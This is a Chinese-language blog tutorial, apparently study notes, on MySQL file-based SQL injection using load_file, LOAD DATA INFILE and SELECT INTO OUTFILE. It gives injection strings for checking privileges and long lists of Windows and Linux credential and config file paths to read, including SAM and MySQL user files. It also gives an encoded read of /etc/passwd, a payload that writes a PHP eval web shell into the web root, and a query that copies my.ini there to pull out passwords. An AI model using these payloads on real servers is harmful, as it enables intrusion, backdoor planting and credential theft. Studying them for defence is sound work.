# 文件型注入


&gt;本文参考博客：https://blog.csdn.net/Kevinhanser/article/details/81592478?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=%E5%AF%BC%E5%85%A5%E6%96%87%E4%BB%B6%E5%9E%8B%E6%B3%A8%E5%85%A5&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-81592478.142^v88^koosearch_v1,239^v2^insert_chatgpt&amp;spm=1018.2226.3001.4187
## 一、基本思路
1.通过使用load_file导出访问dnslog平台；
2.通过hex()对查看的@@basedir mysql的安装目录进行16进制转换，避免url显示不出特殊符号；
【注：因为url长度有限使用substr()函数截取函数分段显示然后再拼接一起查看】
## 二、基础函数
1.**load_file(file_name)**:读取文件并返回该文件的内容作为一个字符串。【相当于导出文件】
使用条件：
（1）文件必须有读写的权限
```
and (select count() from mysql.user)&gt;0/ 如果结果返回正常,说明具有读写权限。
and (select count() from mysql.user)&gt;0/ 返回错误，应该是管理员给数据库帐户降权
```
（2）读取的文件在服务器上
（3）待读取文件大小要小于 max_allowed_packet

MySQL注入load_file常用路径
（1）Windows下
```
 c:/boot.ini 										//查看系统版本
 c:/windows/php.ini 									//php配置信息
 c:/windows/my.ini 									//MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码
 c:/winnt/php.ini
 c:/winnt/my.ini
 c:\mysql\data\mysql\user.MYD 						//存储了mysql.user表中的数据库连接密码
 c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini	//存储了虚拟主机网站路径和密码
 c:\Program Files\Serv-U\ServUDaemon.ini
 c:\windows\system32\inetsrv\MetaBase.xml			//查看IIS的虚拟主机配置
 c:\windows\repair\sam								//存储了WINDOWS系统初次安装的密码
 c:\Program Files\ Serv-U\ServUAdmin.exe				//6.0版本以前的serv-u管理员密码存储于此
 c:\Program Files\RhinoSoft.com\ServUDaemon.exe		
 C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\*.cif文件											//存储了pcAnywhere的登陆密码
 c:\Program Files\Apache Group\Apache\conf\httpd.conf 或C:\apache\conf\httpd.conf											//查看WINDOWS系统apache文件
 c:/Resin-3.0.14/conf/resin.conf						//查看jsp开发的网站 resin												//文件配置信息.
 c:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf	//查看linux系统配置的JSP虚拟主机
 d:\APACHE\Apache2\conf\httpd.conf
 C:\Program Files\mysql\my.ini
 C:\mysql\data\mysql\user.MYD						//存在MYSQL系统中的用户密码
```
（2）Linux下
```
 /usr/local/app/apache2/conf/httpd.conf 				//apache2缺省配置文件
 /usr/local/apache2/conf/httpd.conf
 /usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置
 /usr/local/app/php5/lib/php.ini 					//PHP相关设置
 /etc/sysconfig/iptables 							//从中得到防火墙规则策略
 /etc/httpd/conf/httpd.conf 							// apache配置文件
 /etc/rsyncd.conf 									//同步程序配置文件
 /etc/my.cnf 										//mysql的配置文件
 /etc/redhat-release									//系统版本
 /etc/issue
 /etc/issue.net
 /usr/local/app/php5/lib/php.ini 					//PHP相关设置
 /usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置
 /etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf //查看linux APACHE虚拟主机配置文件
 /usr/local/resin-3.0.22/conf/resin.conf 				//针对3.0.22的RESIN配置文件查看
 /usr/local/resin-pro-3.0.22/conf/resin.conf 			//针对3.0.22的RESIN配置文件查看
 /usr/local/app/apache2/conf/extra/httpd-vhosts.conf 	//APASHE虚拟主机查看
 /etc/httpd/conf/httpd.conf或/usr/local/apche/conf /httpd.conf //查看linux APACHE虚拟主机配置文件
 /usr/local/resin-3.0.22/conf/resin.conf 				//针对3.0.22的RESIN配置文件查看
 /usr/local/resin-pro-3.0.22/conf/resin.conf 同上
 /usr/local/app/apache2/conf/extra/httpd-vhosts.conf	//APASHE虚拟主机查看
 /etc/sysconfig/iptables								//查看防火墙策略
 load_file(char(47))									//可以列出FreeBSD,Sunos系统根目录
 replace(load_file(0×2F6574632F706173737764),0×3c,0×20)
 replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))
```


2.**LOAD DATA INFILE** ：高速地从一个文本文件中读取行，并装入一个表中。文件名称必须为一个文字字符串。【相当于把文件导入数据库】
例：
```
load data infile ‘/tmp/t0.txt’ ignore into table t0 character set gbk fields terminated by &#39;\t’lines terminated by ‘\n’
```
将 /tmp/t0.txt 导入到 t0 表中，character set gbk 是字符集设置为 gbk，fields terminated by 是每一项数据之间的分隔符，lines terminated by 是行的结尾符。当错误代码是 2 的时候的时候，文件不存在，错误代码为 13 的时候是没有权限，可以考虑 /tmp 等文件夹。


3.**SELECT.....INTO OUTFILE &#39;file_name&#39;**：把被选择的行写入一个文件中【向文件中导入】
形式：
（1）直接将 select 内容导入到文件中
```
select version() into outfile &#34;c:\\phpnow\\htdocs\\test.php&#34;
```
或者换成一句话木马
```
select &lt;?php @eval($_post[&#34;mima&#34;])?&gt; into outfile &#34;c:\\phpnow\\htdocs\\test.php&#34;
```
（2）修改文件结尾
```
select version() Into outfile &#34;c:\\phpnow\\htdocs\\test.php&#34; LINES TERMINATED BY 0x16 进制文件
```
通常是用 ‘\r\n’ 结尾，此处我们修改为自己想要的任何文件。同时可以用FIELDSTERMINATED BY
其中，16 进制可以为一句话或者其他任何的代码，可自行构造

注：
根据环境，在文件路径当中要注意转义
当前台无法导出数据的时候，我们可以利用下面的语句
```
 select load_file(&#39;c:\\wamp\\bin\\mysql\\mysql5.6.17\\my.ini&#39;)into outfile &#39;c:\\wamp\\www\\test.php&#39;
```
利用该语句将服务器当中的内容导入到 web 服务器下的目录，这样就可以得到数据了。上述 my.ini 当中存在 password 项（不过默认被注释），当然会有很多的内容可以被导出来

4.**@@basedir**：显示mysql的安装目录
5.**@@datadir**：显示mysql的数据目录
6.**substr(字符串,字符串的起始值,截取的长度)**：截取字符串
7.**hex()**：16进制转换

---

> Author: [Ting](Tin10g.github.io)  
> URL: http://localhost:1313/posts/2023web-%E6%96%87%E4%BB%B6%E5%9E%8B%E6%B3%A8%E5%85%A5/  

